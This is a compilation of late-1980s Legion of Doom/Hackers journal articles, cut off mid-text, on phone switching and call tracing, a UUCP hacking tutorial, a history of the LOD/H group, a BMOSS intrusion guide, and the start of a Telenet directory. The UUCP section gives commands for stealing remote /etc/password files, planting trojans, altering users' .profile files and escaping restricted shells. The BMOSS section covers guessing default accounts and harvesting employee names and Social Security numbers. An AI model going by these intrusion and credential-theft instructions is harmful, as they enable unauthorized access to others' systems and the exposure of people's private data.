was no billing generated at all. The 1AESS does have a program called SIGI
that looks for any 2600 winks after the original connection of a toll call.
It then proceeds to record on AMA and output any MF digits received. For more
information on AMA see Phantom Phreaker's article entitled, Understanding
Automatic Message Accounting in the LOD/H TJ Issue #3. However due to many
long distant carriers using signaling that can generate these messages it is
often overlooked and "SIG IRR" output messages are quite common.

    Loop signaling still uses MF to transmit the called number to distant
switches, however, the polarity of the voltage on the trunk is reversed to
indicate trunk use.

    CCIS sometimes referred to CCS#6 uses a separate data link sending
packets of data containing information regarding outgoing calls. The distant
switch monitors the information and connects the correct trunk to the correct
path. This is a faster and more efficient way of call processing and is being
implemented everywhere. The protocol that AT&T uses is CCS7 and is currently
being accepted as the industry standard. CCS6 and CCS7 are somewhat similar.

    Interoffice trunks are multiplexed together onto one pair. The standard
is 24 channels per pair. This is called T-1 in it's analog format and D-1
in its digital format. This is often referred to as carrier or CXR. The terms
frame error and phase jitter are part of this technology which is often a
world in itself. This type of transmission is effective for only a few miles
on twisted pair. It is often common to see interoffice repeaters in manholes
or special huts. Repeaters can also be found within C.O.s, amplifying trunks
between offices. This equipment is usually handled by the "carrier" room,
often located on another floor. Carrier also handles special circuits, private
lines, and foreign exchange circuits.

     After a call reaches a Toll Switch, the transmit and receive paths of
the calling and called party are separated and transmitted on separate
channels. This allows better transmission results and allows more calls to
be placed on any given trunk. This is referred to as 4 wire switching. This
also explains why during a call, one person can hear crosstalk and the other
cannot. Crosstalk will bleed over from other channels onto the multiplexed
T-Carrier transmission lines used between switches.


    ** CALL TRACING

     So with the Loop Signaling standard format there is no information being
transmitted regarding the calling number between switches. This therefore
causes the call tracing routine to be at least a two step process. This is
assuming that you are trying to trace an anticipated call, not one in
progress. When call trace "CLID" is placed on a number, a message is output
every time someone calls that number. The message shows up on most of the ESS
output channels and gives information regarding the time and the number of the
incoming trunk group. If the call came from within that office, then the
calling number is printed in the message. Once the trunk group is known, it
can usually be determined what C.O. the calls are coming from. This is also
assuming that the calls are coming from within that Bell company and not
through a long distance carrier (IEC). So if Bell knows what C.O. the calls
are coming from, they simply put the called number on the C.I. list of that
C.O. Anytime anyone in that C.O. calls the number in question another message
is generated showing all the pertinent information.

    Now if this were a real time trace it would only require the assistance
of the SCC and a few commands sent to the appropriate switches (i.e.
NET-LINE). This would give them the path and trunk group numbers of the call
in progress. Naturally the more things the call is going through, the more
people that will need to be involved in the trace. There seems to be a common
misconception about the ability to trace a call through some of the larger
packet networks i.e. Telenet and TYMNET. Well I can assure you, they can
track a call through their network in seconds (assuming multiple systems
and/or network gateways are not used) and then all that is needed is the
cooperation of the Bell companies. Call tracing in itself it not that
difficult these days. What is difficult is getting the different organizations
together to cooperate. You have to be doing something relatively serious to
warrant tracing in most cases, however, not always. So if tracing is a
concern, I would recommend using as many different companies at one time as
you think is necessary, especially US Sprint, since they can't even bill
people on time much less trace a call. But...it is not recommended to call
Sprint direct, more on that in the Equal Access section.


    ** EQUAL ACCESS

    The first thing you need to understand is that every IEC Inter Exchange
Carrier (long distance company) needs to have an agreement with every LEC
Local Exchange Carrier (your local phone company) that they want to have
access to and from. They have to pay the LEC for the type of service they
receive and the amount of trunks, and trunk use. The cost is high and the
market is a zoo. The LECs have the following options:

     - Feature Group A -

    This was the first access form offered to the IECs by the LECs. Basically
whenever you access an IEC by dialing a regular 7 digit number (POTS line)
this is FGA. The IECs' equipment would answer the line and interpret your
digits and route your call over their own network. Then they would pick up an
outgoing telephone line in the city you were calling and dial your number
locally. Basically a dial in, dial out situation similar to Telenet's
PC pursuit service.

     - Feature Group B -

     FGB is 950-xxxx. This is a very different setup from FGA. When you dial
950, your local switch routes the call to the closest Access Tandem (AT) (Toll
Switch) in your area. There the IECs have direct trunks connected between the
AT and their equipment. These trunks usually use a form of multiplexing like
T-1 carrier with wink start (2600Hz). On the incoming side, calls coming in
from the IEC are basically connected the same way. The IEC MFs into the AT
and the AT then connects the calls. There are many different ways FGB is
technically setup, but this is the most common.

     Tracing on 950 calls has been an area of controversy and I would like to
clear it up. The answer is yes, it is possible. But like I mentioned earlier,
it would take considerable manpower which equals expensive to do this. It
also really depends on how the IEC interface is set up. Many IECs have
trunks going directly to Class 5 end offices. So, if you are using a small
IEC, and they figure out what C.O. you are calling from, it wouldn't be out
of the question to put CLID on the 950 number. This is highly unlikely and I
have not heard from reliable sources of it ever being done. Remember, CLID
generates a message every time a call is placed to that number. Excessive
call trace messages can crash a switch. However, I should mention that brute
force hacking of 950s is easily detected and relatively easy to trace. If the
IEC is really having a problem in a particular area they will pursue it.

     - Feature Group C -

     FGC is reserved for and used exclusively by AT&T.

     - Feature Group D -
     FGD is similar to FGB with the exception that ANI is MF'ed to the IEC.
The end office switch must have Equal Access capability in order to transmit
the ANI. Anything above a X-bar can have it. FGD can only be implemented on
800 numbers and if an IEC wants it, they have to buy the whole prefix. For a
list of FGD prefixes see 2600 Magazine. You should also be aware that MCI,
Sprint, and AT&T are offering a service where they will transmit the ANI to
the customer as well. You will find this being used as a security or
marketing tool by an increasing amount of companies. A good example would be
800-999-CHAT.

Scope
DDDDD

   Part I of this file is intended for the casual hacker- someone
familiar with UNIX commands, but who hasn't had extended experience
with the UUCP network.  Part II will be intended for the advanced
hacker who has the confidence and knowledge to go out and modify
a UNIX network- the logs, the paths, the permissions, etc...


Introduction
DDDDDDDDDDDD

   Like it or not, UNIX is the most popular operating system in the
world.  As a hacker, you are likely to run into several hundred
UNIX machines over the course of your hacking career.  Knowing how
to move around and use the UNIX environment should be considered
absolutely essential, especially since UNIX is the operating system
of choice among phone company computers.

   This article is not an attempt to teach you how to use UNIX.
If you don't know what a '$ls -x > dir' does, you need to put this
article in your archives, get a good basic file on UNIX (or buy a
book on it- there are several good ones out ((see the Bibliography
at the end of this file for suggestions))), read it, and then play
around some in a UNIX machine.  Please!  If you have managed to
stumble into a Bell system, do *not* use it as a machine to learn
UNIX on!  You *will* get noticed by security, and this will lead
not only to the security being tightened, but may well lead to Bell
Security going through your underwear drawer.

   The information in this article is mainly concerning AT&T System
V UNIX.  I have included BSD 4.3 & Xenix information also in cases
that I was able to determine alternate procedures.  All information
has been thoroughly tested and researched on as many machines as
possible.  Standard disclaimer, your system may be slightly
different.

Glossary & Usage
DDDDDDDDDDDDDDDD

BNU     - Basic Networking Utilities.  System V.3's uucp package.

LAN     - Local Area Network.
network - A group of machines set up to exchange information and/or
          resources.
node    - A terminating machine on a network.
UUCP    - When capitalized, refers to the UNIX networking utilities
          package.
uucp    - In lower case, refers to the program Unix-to-Unix-CoPy.

I. General Information
   DDDDDDDDDDDDDDDDDDD

   A. What is UUCP?

   UUCP is a networking facility for the UNIX operating system.
It is made up of a number of different programs that allow UNIX
machines to talk to each other.  Using UUCP, you can access a
remote machine to copy files, execute commands, use resources, or
send mail.  You can dial out to other non-UNIX computers, and you
can access public mail/news networks such as USENET.

   B. History of UUCP

   The first UUCP system was built in 1976 by Mike Lest at AT&T
Bell Labs.  This system became so popular that a second version was
developed by Lesk, David Nowitz, and Greg Chesson.  Version 2 UUCP
was distributed with UNIX Version 7.

   With System V Release 3, a new version of UUCP that was
developed in 1983 by Peter Honeyman, David A. Nowitz, and Brian E.
Redman.  This version is known as either HoneyDanBer UUCP (from the
last names of the developers), or more conventionally as Basic
Networking Utilities (BNU).  I will stick with BNU, as it is easier
to type.  BNU is backward compatible with Version 2, so there is
no problem communicating between the two.

   BSD 4.3's UUCP release incorporates some of the BNU features,
but retains more similarity to Version 2 UUCP.

   If you are unsure about which version of UUCP is on the system
that you are in, do a directory of /usr/lib/uucp and look at the
files.  If you have a file called L.sys, you are in a Version 2
system.  If there is a file called Systems, then it's BNU.  See
Table 1 for a fairly complete listing of what system runs what UUCP
version.

II. UUCP Communications
    DDDDDDDDDDDDDDDDDDD

    A. Overview of UUCP User Programs

    There are a number of programs that are used by a UUCP
communication network.  Some are standard UNIX programs, others are
exclusively part of the UUCP package.
.................................................................

        These three are standard UNIX commands:

        mail-   UNIX's mail facility can be used to send messages
                to other systems on a UUCP network.
        cu-     Connects you to a remote machine and allows you to
                be logged in simultaneously to both machines.  Also
                allows you execute commands on either machine
                without dropping the link.
        tip-    (BSD) same as cu.

                               +++

        There are five main programs within UUCP:

        uucp-   Does all the setup for a remote file transfer.
                uucp creates files that describe the file transfer
                (called 'work' files), then calls the uucico daemon
                to do the actual work.
        uux-    Used to execute commands on a remote machine.  uux
                performs similar to uucp, except that commands are
                processed instead of files.
        uuname- Used to list the names of other systems that are
                connected to your network.
        uulog-  Displays the uucp log for the specified machine.
                I'll be showing how to cover your uucp tracks from
                this later in the article.
        uustat- Gets the status of uux requests.  Also lets you
                manipulate the contents of a UUCP queue.

                                   +++

        System V also has two additional programs:

        uuto-   Allows you to send files to another user similar
                to the UNIX mail command.
        uupick- Allows you to read files sent to you with uuto.

                                   +++

        BSD 4.3 has two additional programs:

        uuq-    Lets you view & manipulate UUCP jobs that are
                waiting to be processed, similar to System V's
                uupick program.
        uusend- Lets you forward files through a string of systems.
 ..................................................................

III. Using the Programs
     DDDDDDDDDDDDDDDDDD

     A. uuname

     This one is easy & friendly.  All you do is type '$uuname'.
It will spit out a list of all systems on your network.  If you
aren't sure about the name of your local system, invoke uuname with
the -l option. ($uuname -l).

     B. mail

     I'm not going to say to much about mail, as it isn't a program
that you will use much as a hacker except possibly to break out of
a shell.  Sending mail to other people is not a good way to stay
hidden, as all mail transfer to remote systems is logged (no, they
may not read the mail, but they're likely to notice that the
unassigned ADMIN account is suddenly getting mail from all over the
world...)  These logs can be modified, however.  This will
be covered in Part II.

     Briefly, mail is invoked with the command 'mail username' (or
mailx under some systems).  If you wish to send mail to user john
on the system you're on, you would type:

mail john
Dear John-
     This is mail.  Enjoy it.
^D   (usage note, this means control-D)

     To send mail to a user on a remote system, or a string of
systems, you would use the ! key to indicate a remote system name.
If you were on node Alpha and wanted to send mail to john on node
Beta, you would address your mail to 'mail Beta!john'.  If you
wanted to send mail to a user on system that's not connected to
yours, but *is* connected to a machine you are connected to, you
would string together the system names, separated by a !. For
example, if node Saturn was connected to Beta, but not to Alpha,
you could send mail to susan on Saturn with 'mail Beta!Saturn!susan'.

     Please note- If you are running the C-Shell or Bourne Shell,
you will have to prefix the ! with a X.  i.e. 'mail BetaX!SaturnX!susan'.
Also, the mail header displays the system name, return path, and account
name that you send mail from, so don't try to anonymously mail someone
a message- it won't work.

     Another quick feature (this is under the 'basic unix
knowledge' category), if you want to mail a file named 'message'
to someone, you'd type the following - '$mail Beta!Saturn!susan <
message'.

     Finally, as mentioned above, it may be possible to break out
of a restricted shell within mail.  Simply send mail to yourself,
then when you enter mail to read the message, type !sh to exit from
mail into shell. This will often blow off the restricted shell.


     C. File Transfer

     One of the first things that you will want to do when you
discover that you're on a network (uuname, remember?) is to grab
a copy of the /etc/password file from the systems on the net then
run Shooting Shark's password hacking program from TJ Issue #2.
Even if you have no use for it now, save it & label it, you never
know when you might need to get into that system. Besides, when
printed, they make fun & interesting wallpaper.

     Unfortunately, the /etc/ directory will sometimes have access
restricted.  You can get around this by copying the /etc/password
file to the /usr/spool/uucppublic directory using the uux command
(see below).  If the uux program has restrictions on in, then you
may have to actually hack into the remote system using the rlogin
command.  Be persistent.

     UUCP is also useful in that it allows you to send a file from
your system to a remote system.  Got a nice little trojan you need
to insert on their system?  Use UUCP to drop it into the /bin/
directory.  Or if they protected the /bin/ directory (likely, if
they have half a brain), they might have forgotten to protect all
of the users private directories (i.e. /usr/mike or /usr/susan or
sometimes even /usr/admin).  UUCP a copy of a .profile file to your
system, insert your own stuff in it, then UUCP it back to its
original directory where the user will access it the next time he
logs in.  People rarely $cat their .profile file, so you can
usually get away with murder in them.

     While uucp has some limitations, it has the advantage of being
present on every UUCP system in the world.  If you're on a System
V, you will probably use uuto & uupick much more frequently, as
it's easier to do subtle hacks with them.  But if uucp is all you
have, remember, you're a hacker.  Show some ingenuity.  The syntax
of uucp when sending a file is:

$uucp [options] <local source> <remote destination>

     For example, you have a program sitting in your working
directory on node Alpha called 'stuff', and you want to plop it
into the /usr/spool/uucppublic/mike/ directory of node Beta.  The
command would be '$uucp stuff Beta!/usr/spool/uucppublic/mike/'.
(Don't forget to add a slash in front of the exclamation point if
you're in C-Shell or Bourne!)  A good thing to know that will save
you some typing is that the /usr/spool/uucppublic/ directory can
be abbreviated as D/ (in KSH only), so that the above command could look
like '$uucp stuff Beta!D/mike/'.  You can also specify a path other than
D/.  If you wish to drop your 'new & improved' version of the
/etc/password file into the /etc/ directory, you could do a '$uucp
password Beta!/etc/'.  Just don't be surprised if it gets bounced
with a message similar to the following:

                From uucp Sat Dec 24 23:13:15 1988
                Received: by Beta.UUCP (2.15/3.3)
                id AA25032; Sat Dec 24 23:13:15 edt
                Date: Sat Dec 24 23:13:15 edt
                From: uucp
                Apparently to: hacker
                Status: R

                file /etc/password, system Beta
                remote access to path/file denied

     Another hacker-friendly feature of UUCP is the ability to copy
something into a remote user's login directory by entering a D
character before the username.  For example, to dump a modified
.profile file into a user on Beta named alex, you would do the
following:


        '$uucp .profile Beta!Dalex'

The syntax for uucp when receiving a remote file is:

$uucp [options] <remote path> <local directory>

For example, you wish to grab Beta's password file and put it in
a subdirectory called tmp in the account 'hacker' on node Alpha.
The command would be:

'$uucp Beta!/etc/password Alpha!/usr/hacker/tmp/'.

The same things concerning use of tildes (D) demonstrated in
sending files applies when receiving them. The following table
contains valid options to the uucp command.

     D. Executing Remote Commands

     The uux program allows users to execute a program on another
system on the network.  While in theory this is the most useful
command a hacker can use, in practice it is usually heavily
restricted- any system administrator with half a brain realizes
that letting people execute any command they like from across the
country is not the way to maintain system integrity.

     There are, however, some useful things that can be done with
uux even if the sysadmin has protected the things that *he* thinks
are dangerous (remember, he's not a hacker, you are.  You are
smarter, more persistent, and much cleverer than he is.  He doesn't
like coming to work every day, can't wait to leave, and will do the
minimum possible to get by.  You're different. You're dedicated &
tricky.  You *like* what you're doing.  If you don't, get the hell
out & let others who do take over.  End of the pep talk.)

     The format for the uux command is:

$uux [options] command-string.

See Table 3 below for a list of options.

     Ok, ideal case.  The System manager of Beta is an idiot who
has left all possible commands open, and the uucico daemon has root
privs.  Let's say you want to alter the protection of the password
file, copy it into the D/ (public, remember?) directory, then copy
it over to your system.  The sequence of commands would be:

$uux Beta!chmod 777 /etc/password
$uux Beta!cp /etc/password /usr/spool/uucppublic/info.txt
$uucp Beta!D/info.txt /usr/hacker/

     The first line would modify the protection where anyone could
get to it, the second line would copy it into the D/ directory, and
the third line would send it along to you.

     Unfortunately, most commands are disabled (useful ones like
chmod and cat and ls, at least.)  But sometimes you can get around
that.  For instance, often you might not be able to ls or cp the
password file.  But very rarely will mail be disabled.  So if you
wanted a copy of the password file, you have them mail you one:

$uux Beta!mail Alpha!hacker < /etc/password

     Later in the UUCP Administration section, I'll explain how to
modify the remote system so any command you want is executable.

     When you execute a remote command, UUCP will automatically
send you mail telling you how it went.  It's a good idea to check
the logs and see if there's anything you need to remove to cover
your presence (this subject will be covered in Part II).

     If you are executing a command that is going to need data from
a file, you specify that the file is on your local system by
prefacing it with a X!.  I can't think of many reasons to use this,
but perhaps you can.  As an example, let's say you wanted to print
a file in your directory called 'stuff' out on a remote laser
printer (bad hacking practice, and difficult to retrieve.) Do this:

$uux Beta!lp -dlaser X!stuff

     If the command you want to execute (whodo in this example) is
forbidden, you will get a notification message similar to the
following:

>From uucp Sat Dec 24 23:12:15 EDT 1988
>From uucp Sat Dec 24 23:12:13 EDT 1988 remote from Beta
Status: R0
uuxqt cmd (whodo) status (DENIED)

     If you are going to need the standard output for a command,
pipe it into D/.  And any files or processes created by uux will
belong to the user uucp, not to you.

     E. uustat & uulog

     These two programs are used to track UUCP jobs and examine
their status.

     uustat prints out a one-line summary for each job, telling you
if the job is finished or the job is queued.  Older versions of
uustat will have the job state as either JOB DELETED or JOB IS
QUEUED.  The output of uustat will look like the following:

$uustat

   1001 hacker Alpha 10/31-09:45 10/31-10:15 JOB IS QUEUED
   1002 hacker Alpha 10/30-08:15 10/30-11:25 COPY FINISHED
    |      |     |        |           |             |

  job #   user  node  start-time  status-time    job-status

See Table 4 for a list of options for the uustat command.

     uulog is a more thorough version of uustat, as it tracks the
status messages logged by the system as your job proceeded through
the system.  See Table 5 for options of the uulog command.

                            The History of LOD/H
                            Revision #3 May 1990
                            written by Lex Luthor


NOTES: I approximated all dates, as my records are not totally complete.
       If I left anyone out or put someone in that shouldn't be in, sorry I
       tried and did spend considerable time researching the dates and
       BBS files, the old LOD BBS software, etc. Revisions one and two were
       released to LOD/H members only. Some information may only be relevant
       to those who were around at the time.


   The primary purpose of this article is simply to present an accurate
picture of events and people who have been associated with this group. The
reputation of many groups and many people have been tainted by slanderous
remarks made by uninformed law enforcement and justice department personnel,
the media, and other hackers. I find this sad, but it's a fact of life that
must be endured. All that can be done in this article is to attempt to present
the facts as I see them. Due to the wild and unfounded accusations by said
persons, today LOD is viewed more as malicious criminals than as for what it
was viewed as in the past. That is, of a group of people who put themselves at
risk to help inform others. Of course this is a prettier picture than most
want to believe, and is slightly prettier than what it is in actuality, but
the ideal is there. Whenever a group of individuals get together, you cannot
forget that they are individuals. These individuals can and do make mistakes
in judgement in some cases. But also, they have been and continue to be
victimized by law enforcement and said others. Over the years I have collected
tens of newspaper and magazine articles about "The LOD", myself, and others
with not a one being perfectly accurate. You have heard it before: don't
believe everything you read. That goes for this article also, although I have
made an honest attempt at ensuring that it is truthful and accurate, as Ripley
said: believe it, or not.

   I have been "retired" for quite some time now. My definition of retired is
simply that of keeping my activities to those of a strictly legitimate nature.
It is quite funny yet pitiful to here people say, "once a crook always a
crook" AND BELIEVE IT! That statement is a fallacy. Nearly everyone has done
something wrong when they were young yet many grow up to become the so called
normal, law abiding citizens that society says we should be. At this point in
time and in the foreseeable future, the risks of exploring and learning about
telephone and computer networks in a less than legitimate fashion outweigh the
benefits. I think many of the older hackers have adopted this philosophy out
of necessity. This decision is even easier after reflecting on the events of
which I have seen during the course of my "career". Those events are primarily
those of seeing people's rights being violated by law enforcement. Their
privacy being forsaken by the media. I do not dispute however, that some
hackers have done these same things to other hackers and other people. Neither
side is right or fair so I suppose it is time to exit since it's getting too
hot in the kitchen. I will remain however, in an advisory capacity to the
Technical Journal and group for as long as they continue exist. If you are to
believe the rumors, LOD has been dead many times, again untrue. The main
drawback of becoming a BBS hermit is how the rumors start to accrue as time
progresses. I have been "busted" perhaps a hundred times if you believe every
rumor. The fact is that I have never been visited let alone busted. I have
seen many people get into trouble due to their own carelessness. Those who
have remained unmolested by the authorities are either very careful and
paranoid, or are helping them catch others. I have been extremely careful and
exceedingly paranoid, period.

   Now that I have harassed the reader with my comments regarding the whole
hacking/phreaking experience, I present the story. Please note that I realize
many people could care less about all this, and if you are in that category
you can always throw this into the shredder, now. But, there is a sufficient
number of people who actually are curious to get the real story on this stuff
so here it is, presented to correct the many inaccuracies which have surfaced
over the years and also for the sake of posterity.

_____________________________________________________________________________

   During the winter break from school in late 1983, I took a trip up to Long
Island, NY to visit Quasi Moto. I had met him in south Florida, and he had
since moved. He decided to put up a BBS, and while visiting him, we worked on
it. For those who do not remember, its name was PLOVERNET. PLOVERNET was
considered a resurrected OSUNY by some since some users migrated to PLOVERNET
after OSUNY went down, at least in part, by an article in Newsweek mentioning
it. A new hacker magazine, 2600, started posting advertisements on various
boards. I had been in contact with Emmanuel Goldstein, the editor of 2600, on
Pirates Cove, another 516 BBS. I gave him the number to PLOVERNET and due to
the large amount of users, (500, of which 70% were relatively active) 2600 had
plenty of response. PLOVERNET went online in January of 1984 and shortly
thereafter it was the busiest BBS around. It was so busy in fact, that a long
distance service called LDX had stopped connecting people who dialed
516-935-2481 which was PLOVERNET's number. Now remember, this is early 1984
here. The practice of blocking calls to a certain number wasn't really done
by common carriers until 1986/87 with the emergence of new security software
and audit trail information. I picked the best phreaks and hackers from
PLOVERNET and invited them onto the newly created LOD BBS. LOD was one of the
first boards which upon connection did nothing until you entered the primary
password, and there was no new user routine as the board was invitation only.
Again, this was back in early 1984. It was a fairly original albeit paranoid
practice at the time, and many boards subsequently adopted the technique as
security became an increasing concern.

   Various groups had started forming such as Fargo 4A and Knights of Shadow.
I was admitted into Knights of Shadow in early 84. After suggesting some
promising new phreaks/hacks for membership and being turned down because they
were not well known enough, (ie: they weren't big names even though they knew
more than the guys who supposedly were) I put up the Legion Of Doom! bulletin
board and shortly thereafter started a phreak/hack group of the same name.
This was about May of 84 from what my records show. I had been a member of
KOS and LOD or a brief time and then KOS broke up. Although there were many
users on the LOD bbs, VERY FEW WERE MEMBERS OF THE GROUP! This distinction
seems to have been forgotten by many, since some who were on the BBS have
claimed to have been in the group, which is not true.

   The name Legion Of Doom! obviously came from the cartoon series which
pitted them against The Superfriends. I suppose other group names have
come from stranger sources. My handle, Lex Luthor was taken from the
movie Superman I. In the cartoon series, LOD is led by Lex Luthor and
thus, the group name was rather fitting. Being young and naive, I thought
having a handle of someone who claimed to have 'the greatest criminal mind on
Earth' and leading a group of the world's most notorious criminals would be
cool. That was about 7-8 years ago. Now however, I see that there is nothing
cool or attractive about being a criminal (believe it, or not).

   The original group consisted of phreaks who I had thought were very good
but were not considered 'famous' like those in KOS. Those original members
later became some of the best known phreak personalities and contributed
substantially to the knowledge of new and old phreaks alike. A list of members
from the very beginning to the present follows. Through my records and from
the best of my recollection I have approximated dates of entrance and exit and
other information. Also, I believe I have a complete list however, there
could be a mistake or two. Very few if any, handles from the past have been
duplicated by 'impostors' whether knowingly or unknowingly.

   I look at this article as a historical document seeing how no other group
has survived as long as LOD has. LOD originally consisted mainly of phreaks,
but had split into two separate entities.  LOD for telecommunications
hobbyists, and LOH for hacking and security enthusiasts.

INTRODUCTION:

   Those who have actually trashed at Bell Co. before know that finding an
installation can be a pain.  Most Telco buildings these days are un-marked,
plain, and generally overlooked by the average person.  The buildings
were specifically made so that they WOULD be overlooked, concealing
itself and its contents.  Knowing where all Bell Co. installations are
would be nice, and through the help of BMOSS we can find out where they
ALL are.

NOTE: It is possible to get locations from your city hall, just take a
look at what property Bell Co. owns and locate it.  However, there are few
catches to this method.  First, most cities charge you to find out who
owns what property and there might be a waiting period of a few days.
Second, not all Bell Co. property is owned by Bell Co.  There are
instances of Bell Co. renting a piece of property from a company and
using the existing building, possibly with the leasing companies logo
still on it.

   BMOSS stands for Building Maintenance Operations Service System.
BMOSS provides computer support for daily building maintenance tasks.
A comprehensive database helps users keep track of repair activities.
Telco field mechanics logon everyday to do assorted field mechanic
stuff.  From BMOSS they can check on tasks needed to be done, send
messages to users, charge various Telco installations for work, log time
sheets, generate purchase orders, see where his buddies are eating lunch etc.

   BMOSSes are usually located in a BOCC (Building Operations Control
Center) or in a REOC (Real Estate Operations Center).  BMOSS is run
under AT&T Unix System V and at some points is quite Unix-like.  At each
center is one PDP-11/44 or a PDP-11/84 mainframe that is the base of
operations for that center and other installations supported by that
BOCC/REOC.

LOGGING ONTO BMOSS:

   Before logging on to BMOSS you must select the proper type of
terminal emulation.  BMOSS has 4 types of emulations available for all
users.  Users within the BOCC/REOC use either VT100 or VT220 compatible
terminals, while other internal stations will use an LA120 printer
terminal.  Field Mechanics at a remote location use their typewriter
like LA12 printer terminals.

   Identifying a BMOSS dialup is not that hard at all.  After hitting a
three [CR]'s the system will respond with something like this:

   (BEEP!)

   Good Morning   (Depending on what time of day it is)

   BASE/OE - Fri 04/23/90 09:43:22 - Online 9

   User ID?
   Password?

   Typically user IDs are the three initials of the field mechanics name.
After inputting your ID you will be prompted with a Password? request.
Passwords can be from 6 to 8 characters in length, including punctuation
marks, the first letter must begin with an alphabet-letter or a number.
They cannot contain spaces or the users first/middle/last name.
Periodically the system will prompt the user for a new password.  This
period of time is usually set by the system administrator.

   I have found that the "WRK:A10" user ID or a variation of WRK:xxx
where xxx is a alpha-numerical combination has worked excellent for me.
I believe the WRK:xxx is some type of low-level account when field
mechanics lose their current ID/PW combination.  Initials also have been
found on most of the systems, so a WRK:xxx and Initials brute-force attempt
just may give you a working ID.


IN BMOSS:

   Once penetrating initial security you are then prompted with BMOSS's
FLD> main level identifier.  This FLD> changes as you move from BMOSS's
root to the various main BMOSS branches.

   Sometimes when you logon to BMOSS you will receive a memo saying,
"NOTE - Check your office" at this time go to the Office and read the memos
sent to you.  Read THE OFFICE later in this article to learn how.

   BMOSS was designed with the average Joe in mind and is very logically
laid out.  BMOSS was modeled after UNIX's Tree-oriented structure.
Here is a Tree of BMOSS's structure:

                                BMOSS
                     _____________|_____________
                     |    |    |     |    |    |
                    CON  DAT  ACT   FOR  BIL  OFF

Main Branches:
CON- Control Functions (Sys Admin payroll/timesheet functions)
DAT- Database Maintenance (What we are mainly concerned with)
ACT- Field Activity (Handles field activities)
FOR- Force Administration (Recording labor hrs for time sheets etc.)
BIL- Bill Paying (Processing purchase orders, producing expense accts.)
OFF- Electronic Office (Receive/Send Messages or Page users)

   Each main branch then branches off into its own specific
commands.  I will concentrate on the Database Maintenance functions since
the other functions have little or no use to us.

DATABASE MAINTENANCE:

   To haul in the mother lode you go into the Database Maintenance area
from the root.  This is accomplished by typing DAT in at the FLD>
prompt.  Now you should get a DAT> prompt meaning you are now in the
Database Maintenance section.  To get a listing of the available DAT
commands type in 'SHO' which is short for SHOW.  We are mainly concerned
with the BLD (Building Master) function.  Once the BLD function is
selected you will be prompted for a sub-form. There are 7 sub-forms for
the BLD function.

   BLD Sub-Forms:
1. GEN- General Background
2. OWN- Building Ownership (used for adding a new building to database)
3. LES- Lease Terms (used for adding a new building to database)
4. EMG- Emergency Data (contains Police and Fire Dept. that serve this
        location and their respective telephone numbers, and whether the
        location has backup power and fire-sprinklers etc.)
5. RES- Maintenance Responsibility (Maintenance entries for building)
6. WRD- Building Warden (Building Wardens number etc.)
7. NOT- General Notes (Notes about the particular building)
8. ACC- Accounting Distribution (Account for particular building)

Accessing the above information is as easy as selection of the three
letter identifier at the Sub-Form prompt.  We are particularly concerned
with the GEN (General Background) information.  This function gives us the
following data:

 1. Building's Number
 2. Building's Complete Address
 3. Building's Name
 4. Building's Sector (Bell informational purposes only)
 5. Building's Zone   (Bell informational purposes only)
 6. Whether or not Bell owns the building. (A Y/N combination is usually
    shown here.  Y meaning its is owned by Bellco, N meaning its not
    owned by Bellco.)
 7. The building's group (One letter identifier)
 8. The building's use.  (Garage/Warehouse/Office etc.)
 9. The kind of telephone equipment used in the building. (ESS1A etc.)
10. Whether or not Bell is Sub-leasing parts of the building. (Y/N identifier)
11. The number of floors in the building
12. The number of basements in the building (A number of 3 here would
    mean the building has 3 below ground level floors.
13. Whether or not the building has a cable vault. (Y/N identifier)
14. Gross Square footage of the building
15. The number of reserved parking spaces for the building.

   Once entering the DAT section and entering GEN as your sub-form
selection you will be prompted for a building number.  Random selection
of building numbers is necessary because they vary from area to area.
Once a legitimate building number is accessed the above information will
be displayed.

   Ok, you now have the information you need, how do you get back to a
previous directory or even log off ? That's quite easy.  Typing in EXI
(short for EXIT) will bring you back up to the root FLD> one directory at
a time.  For logging off the system you should hit EXI until you reach the
FLD> root then BYE and you will get:

   BASE/OE - Fri 4/23/90 10:22:13 - Offline 9

   Have a Good Morning

OTHER FUNCTIONS:

   I have found the REPORTS function most helpful in finding other
user IDs.  To get a listing of the 20+ different types reports type
'HELP REPORT' at the FLD> prompt.  We are particularly concerned with
REPORT 41, the Estimated vs. Actual Hours Log.  We bring this up by
typing from the FLD:

FLD> REPORT 41 04/02/90-04/06/90  <cr>

   You are inquiring for the estimated vs. actual hours time on a series
of jobs from April 4th 1990 through April 6th 1990.  The output then
kicks out the hours and such.  Every field mechanic that worked throughout
those days will be displayed in- First name, Middle Initial, and Last Name
totally spelled out for you.

   Another useful report is REPORT 90- Data Access Log.  It is called up
by typing:

FLD> REPORT 90 <cr>
Date Range? 04/06/90-04/08/90

   The system then kicks out all users that used the SCOPE command on
other users.  The system prints out the users full name and actual USER ID
and who the user scoped including the scoped-user's Social Security number.

THE OFFICE:

   When you are prompted that you should check your messages you should
do so immediately before any work is done in BMOSS.  First you must go to
your office which is done by selecting OFF from the FLD> identifier.
Once this is done your FLD> prompt will change to a OFF> prompt.  Typing
HELP will give you the available HELP commands for the office.

   To check the messages type in:

   OFF> STATUS <cr>

   BMOSS will reply with the following: (example)

       Memo            From User              Subject          Status
   --------------  ------------------  ----------------------   ---
   IPAAA 04/01/90  Wile E Coyote       Current Task Info        OUT
   BNAAA 04/02/90  Susie B Hott        Last Saturday Night      IN

   The user then sees he has a memo from his boss about his current
tasks and a memo from his co-worker/seductress Susie B. Hott.  Fuck his
boss, he wants to read what Susie has to say.  So you type in:

   OFF> PRINT BNAAA <cr>


                              --- MEMO ---
   Date: 04/02/90
   Time: 08:11

   From: Susie B Hott
   To: Legion Of Doom

   Subject: Last Saturday Night

   LOD, I really enjoyed last saturday night.  We must do it again.
   Give me a call soon, 555-WETT.
   ** Susie


   A useful command is a list of OFFICE users.  This gives you another
   listing of user's Full-Name/ID combinations.  Get this by typing:

   OFF> USERS <cr>

   It will then print out the users who are in the Electronic Office
   database.

   CONCLUSION:

   You can get HELP from anywhere just by typing HELP from the prompt.
Or if you need specific information about a function type in HELP then
the function name. Such as:

   FLD> HELP REPORT  (This gives you options/help on the REPORT command)

   BMOSS can be used for a large amount of purposes for the
hacker/trasher.  Even though it doesn't have any really powerful
commands to self-destruct the telephone company it can be used to access
other building's trash, and other things that may interest you.

                       The Legion Of Hackers Present:
                       Updated:  Telenet Directory
                       Part A: Addresses 201XXX to 424XXX
                       Revision #5 Last Updated: 2/10/90
                       (Includes Mnemonic Host Names)

                           Scanned and Written by:
                                Erik Bloodaxe

INTRODUCTION:
-------------

It has been some time since our last update. Our old list (Revision #4) has
been distributed to those in the United States and internationally thanks to
